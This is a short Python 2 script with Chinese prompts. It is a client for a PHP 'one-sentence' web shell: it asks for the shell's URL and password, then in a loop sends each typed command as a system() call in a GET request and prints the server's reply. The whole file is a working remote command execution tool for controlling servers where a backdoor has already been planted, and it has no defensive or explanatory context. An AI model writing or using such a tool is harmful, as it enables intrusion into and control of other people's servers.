import urllib
import urllib2

print('输入你的一句话地址：')

h = "http://"
user_input_url = raw_input("格式为[IP + XX.php]")
user_input_pwd = raw_input("输入你的一句话密码：")


while 1:
    user_input_cmd = raw_input("命令>>>")

    data = {user_input_pwd:"system('" + user_input_cmd + "');"}

    data = urllib.urlencode(data)
    
    requrl = h + user_input_url + "?" + data
    
    req = urllib2.Request(requrl)

    ope = urllib2.urlopen(req)

    print(ope.read())

